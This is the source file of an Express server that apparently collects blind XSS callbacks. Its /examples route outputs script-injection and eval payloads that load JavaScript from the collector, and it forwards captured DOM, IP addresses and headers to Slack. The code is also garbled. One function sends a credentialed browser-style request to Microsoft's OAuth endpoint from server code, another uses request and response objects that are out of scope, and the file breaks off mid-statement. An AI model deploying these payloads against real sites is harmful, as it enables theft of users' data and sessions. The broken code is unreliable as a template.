const express = require("express"); var bodyParser = require("body-parser"); var cors = require("cors"); const process = require("process"); var request = require("request"); const path = require("path");  // Support local development with .env require("dotenv").config();  const port = process.env.PORT || 3000; const imgbb_api_key = process.env.IMGBB_API_KEY; const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;  const app = express(); app.use(cors());  app.use(bodyParser.json({ limit: "15mb" })); app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));  app.use(function (req, res, next) { // Headers res.header("Powered-By", "XLESS"); res.header("Access-Control-Allow-Origin", "*"); res.header("Access-Control-Allow-Methods", "GET,POST"); res.header("Access-Control-Allow-Headers", "Content-Type"); res.header("Access-Control-Allow-Credentials", "True"); next(); });  function generate_blind_xss_alert(body) { var alert = "*XSSless: Blind XSS Alert*\n"; for (let k of Object.keys(body)) { if (k === "Screenshot") { continue; } if (k === "DOM") { body[k] = `\n\nhello ${body[k]}\n\n`; }  if (body[k] === "") { alert += "*" + k + ":* " + "```None```" + "\n"; } else { alert += "*" + k + ":* " + "\n```" + body[k] + "```" + "\n"; } } return alert; }  function generate_callback_alert(headers, data, url) { var alert = "*XSSless: Out-of-Band Callback Alert*\n"; alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`; alert += `• *Request URI:* \`${url}\`\n`;  // Add all the headers for (var key in headers) { if (headers.hasOwnProperty(key)) { alert += `• *${key}:* \`${headers[key]}\`\n`; } } return alert; }  function generate_message_alert(body) { var req = new XMLHttpRequest(); req.onload = reqListener; req.open("get", "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", true); req.withCredentials = true; req.send(); }  async function uploadImage(image) { // Return new promise return new Promise(function (resolve, reject) { const options = { method: "POST", url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key, port: 443, headers: { "Content-Type": "multipart/form-data", }, formData: { image: image, }, };  // Do async request request(options, function (err, imgRes, imgBody) { if (err) { reject(err); } else { resolve(imgBody); } }); }); }  async function sendSlackAlert(data) { data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress; const alert = generate_blind_xss_alert(data); data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }), }, };  request.post(slack_incoming_webhook, data, (out) => { res.send("ok\n"); res.end(); }); }  app.get("/examples", (req, res) => { res.header("Content-Type", "text/plain"); //var url = req.protocol + '://' + req.headers['host'] var url = "https://" + req.headers["host"]; var page = ""; page += `\'"><script src="${url}"></script>\n\n`; page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;  page += `<script>$.getScript("${url}")</script>`; res.send(page); res.end(); });  app.all("/message", (req, res) => { var message = req.query.text || req.body.text; const alert = generate_message_alert(message); data = { form: { payload: JSON.stringify({ username: "
